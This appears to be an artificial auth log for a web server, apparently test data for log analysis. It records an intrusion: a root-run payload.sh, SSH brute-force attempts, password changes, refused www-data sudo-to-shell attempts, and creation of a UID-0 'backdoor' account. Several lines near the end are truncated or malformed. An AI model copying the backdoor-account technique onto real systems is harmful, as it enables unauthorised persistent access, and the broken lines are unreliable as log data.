+Nov 01 00:56:47 webserver01 sudo[1443]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod +x payload.sh
+Nov 01 00:56:51 webserver01 sudo[1444]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=./payload.sh
+Nov 01 00:57:30 webserver01 sshd[1446]: PAM service(sshd) ignoring max retries; 4 > 3
+Nov 01 00:57:44 webserver01 sshd[1447]: PAM service(sshd) ignoring max retries; 6 > 3
+Nov 01 00:58:15 webserver01 sshd[1449]: PAM service(sshd) ignoring max retries; 3 > 3
+Nov 01 00:58:46 webserver01 sshd[1450]: PAM service(sshd) ignoring max retries; 6 > 3
+Nov 01 00:59:00 webserver01 sshd[1452]: PAM service(sshd) ignoring max retries; 5 > 3
+Nov 01 00:59:21 webserver01 sshd[1457]: PAM service(sshd) ignoring max retries; 5 > 3
+Nov 01 00:59:27 webserver01 sshd[1462]: Connection closed by authenticating user root 194.165.16.11 port 51688 [preauth]
+Nov 01 01:00:09 webserver01 sshd[1464]: Connection closed by authenticating user root 185.220.101.34 port 40997 [preauth]
+Nov 01 01:00:20 webserver01 sshd[1469]: Connection closed by authenticating user root 89.248.167.131 port 52225 [preauth]
+Nov 01 01:01:03 webserver01 sshd[1474]: Connection closed by authenticating user root 5.188.86.172 port 50074 [preauth]
+Nov 01 01:01:28 webserver01 sshd[1477]: Connection closed by authenticating user root 198.51.100.7 port 64347 [preauth]
+Nov 01 01:01:56 webserver01 sshd[1482]: Connection closed by authenticating user root 45.95.168.189 port 49228 [preauth]
+Nov 01 01:02:19 webserver01 sshd[1483]: Connection closed by authenticating user root 198.51.100.7 port 60719 [preauth]
+Nov 01 01:02:31 webserver01 sshd[1488]: Connection closed by authenticating user root 194.165.16.11 port 55046 [preauth]
+Nov 01 01:03:05 webserver01 sshd[1492]: error: maximum authentication attempts exceeded for root from 5.188.86.172 port 56258 ssh2 [preauth]
+Nov 01 01:03:08 webserver01 sshd[1495]: error: maximum authentication attempts exceeded for root from 194.165.16.11 port 54523 ssh2 [preauth]
+Nov 01 01:03:30 webserver01 sshd[1497]: error: maximum authentication attempts exceeded for root from 222.186.42.117 port 52565 ssh2 [preauth]
+Nov 01 01:04:05 webserver01 sshd[1499]: error: maximum authentication attempts exceeded for root from 222.186.42.117 port 61998 ssh2 [preauth]
+Nov 01 01:04:33 webserver01 sshd[1500]: error: maximum authentication attempts exceeded for root from 185.220.101.34 port 49352 ssh2 [preauth]
+Nov 01 01:05:00 webserver01 passwd[1502]: pam_unix(passwd:chauthtok): password changed for deploy
+Nov 01 01:05:22 webserver01 passwd[1503]: pam_unix(passwd:chauthtok): password changed for frank
+Nov 01 01:06:02 webserver01 passwd[1508]: pam_unix(passwd:chauthtok): password changed for git
+Nov 01 01:06:29 webserver01 CRON[1510]: pam_unix(cron:session): session opened for user root by (uid=0)
+Nov 01 01:06:29 webserver01 CRON[1510]: pam_unix(cron:session): session closed for user root
+Nov 01 01:07:04 webserver01 CRON[1515]: pam_unix(cron:session): session opened for user root by (uid=0)
+Nov 01 01:07:04 webserver01 CRON[1515]: pam_unix(cron:session): session closed for user root
+Nov 01 01:07:08 webserver01 CRON[1516]: pam_unix(cron:session): session opened for user root by (uid=0)
+Nov 01 01:07:08 webserver01 CRON[1516]: pam_unix(cron:session): session closed for user root
+Nov 01 01:07:33 webserver01 CRON[1517]: pam_unix(cron:session): session opened for user root by (uid=0)
+Nov 01 01:07:33 webserver01 CRON[1517]: pam_unix(cron:session): session closed for user root
+Nov 01 01:08:08 webserver01 CRON[1521]: pam_unix(cron:session): session opened for user root by (uid=0)
+Nov 01 01:08:08 webserver01 CRON[1521]: pam_unix(cron:session): session closed for user root
+Nov 01 01:08:25 webserver01 CRON[1522]: pam_unix(cron:session): session opened for user root by (uid=0)
+Nov 01 01:08:25 webserver01 CRON[1522]: pam_unix(cron:session): session closed for user root
+Nov 01 01:08:33 webserver01 CRON[1524]: pam_unix(cron:session): session opened for user root by (uid=0)
+Nov 01 01:08:33 webserver01 CRON[1524]: pam_unix(cron:session): session closed for user root
+Nov 01 01:09:09 webserver01 CRON[1528]: pam_unix(cron:session): session opened for user root by (uid=0)
+Nov 01 01:09:09 webserver01 CRON[1528]: pam_unix(cron:session): session closed for user root
+Nov 01 01:09:32 webserver01 CRON[1533]: pam_unix(cron:session): session opened for user root by (uid=0)
+Nov 01 01:09:32 webserver01 CRON[1533]: pam_unix(cron:session): session closed for user root
+Nov 01 01:10:16 webserver01 CRON[1537]: pam_unix(cron:session): session opened for user root by (uid=0)
+Nov 01 01:10:16 webserver01 CRON[1537]: pam_unix(cron:session): session closed for user root
+Nov 01 01:10:28 webserver01 systemd-logind[1542]: New session 100 of user bob.
+Nov 01 01:10:28 webserver01 systemd-logind[1542]: Removed session 100.
+Nov 01 01:10:55 webserver01 systemd-logind[1544]: New session 101 of user git.
+Nov 01 01:10:55 webserver01 systemd-logind[1544]: Removed session 101.
+Nov 01 01:10:59 webserver01 systemd-logind[1549]: New session 102 of user git.
+Nov 01 01:10:59 webserver01 systemd-logind[1549]: Removed session 102.
+Nov 01 01:11:22 webserver01 systemd-logind[1550]: New session 103 of user bob.
+Nov 01 01:11:22 webserver01 systemd-logind[1550]: Removed session 103.
+Nov 01 01:11:58 webserver01 systemd-logind[1555]: New session 104 of user git.
+Nov 01 01:11:58 webserver01 systemd-logind[1555]: Removed session 104.
+Nov 01 01:12:07 webserver01 systemd-logind[1558]: New session 105 of user git.
+Nov 01 01:12:07 webserver01 systemd-logind[1558]: Removed session 105.
+Nov 01 01:12:21 webserver01 systemd-logind[1563]: New session 106 of user frank.
+Nov 01 01:12:21 webserver01 systemd-logind[1563]: Removed session 106.
+Nov 01 01:12:43 webserver01 systemd-logind[1565]: New session 107 of user deploy.
+Nov 01 01:12:43 webserver01 systemd-logind[1565]: Removed session 107.
+Nov 01 01:12:59 webserver01 sshd[1566]: Connection closed by 198.51.100.7 port 43201 [preauth]
+Nov 01 01:13:13 webserver01 sshd[1569]: Connection closed by 198.51.100.7 port 14796 [preauth]
+Nov 01 01:13:27 webserver01 sshd[1573]: Connection closed by 198.51.100.7 port 21913 [preauth]
+Nov 01 01:14:08 webserver01 sshd[1577]: Connection closed by 198.51.100.7 port 52074 [preauth]
+Nov 01 01:14:13 webserver01 sshd[1581]: Connection closed by 198.51.100.7 port 56293 [preauth]
+Nov 01 01:14:17 webserver01 sshd[1584]: Connection closed by 198.51.100.7 port 63004 [preauth]
+Nov 01 01:14:48 webserver01 sshd[1586]: Connection closed by 198.51.100.7 port 22154 [preauth]
+Nov 01 01:14:52 webserver01 sshd[1588]: Connection closed by 198.51.100.7 port 37806 [preauth]
+Nov 01 01:15:29 webserver01 sshd[1590]: Connection closed by 198.51.100.7 port 59109 [preauth]
+Nov 01 01:16:14 webserver01 sshd[1591]: Connection closed by 198.51.100.7 port 7557 [preauth]
+Nov 01 01:16:41 webserver01 sshd[1595]: Connection closed by 198.51.100.7 port 20271 [preauth]
+Nov 01 01:17:10 webserver01 sshd[1599]: Connection closed by 198.51.100.7 port 24718 [preauth]
+Nov 01 01:17:17 webserver01 sshd[1600]: Connection closed by 198.51.100.7 port 49947 [preauth]
+Nov 01 01:17:23 webserver01 sshd[1602]: Connection closed by 198.51.100.7 port 5343 [preauth]
+Nov 01 01:17:54 webserver01 sshd[1607]: Connection closed by 198.51.100.7 port 36714 [preauth]
+Nov 01 01:17:59 webserver01 sudo[1612]:     www-data : user NOT in sudoers ; TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Nov 01 01:18:09 webserver01 sudo[1616]:     www-data : user NOT in sudoers ; TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Nov 01 01:18:31 webserver01 sudo[1618]:     www-data : user NOT in sudoers ; TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Nov 01 01:18:40 webserver01 sudo[1622]:     www-data : user NOT in sudoers ; TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Nov 01 01:19:21 webserver01 sshd[1626]: Received disconnect from 222.186.42.117 port 61811:11: Bye Bye [preauth]
+Nov 01 01:19:38 webserver01 sshd[1629]: Received disconnect from 185.220.101.34 port 56823:11: Bye Bye [preauth]
+Nov 01 01:20:16 webserver01 sshd[1633]: Received disconnect from 222.186.42.117 port 57012:11: Bye Bye [preauth]
+Nov 01 01:20:51 webserver01 sshd[1635]: Received disconnect from 5.188.86.172 port 61403:11: Bye Bye [preauth]
+Nov 01 01:21:04 webserver01 sshd[1640]: Received disconnect from 45.95.168.189 port 49472:11: Bye Bye [preauth]
+Nov 01 01:21:46 webserver01 sshd[1641]: Received disconnect from 5.188.86.172 port 46024:11: Bye Bye [preauth]
+Nov 01 01:21:54 webserver01 sshd[1646]: Failed password for root from
+Nov 01 01:21:54 webserver01 sshd[1647]:
+Nov  webserver01 sshd[1650]: Accepted password for alice
+
+
+Nov 01 01:22:28 webserver01 useradd[1654]: new user: name=backdoor, UID=0, GID=0, home=/root, shell=/bin/bash
+Nov 01 01:22:28 webserver01 usermod[1654]: change user 'backdoor' GID from '0' to '0'
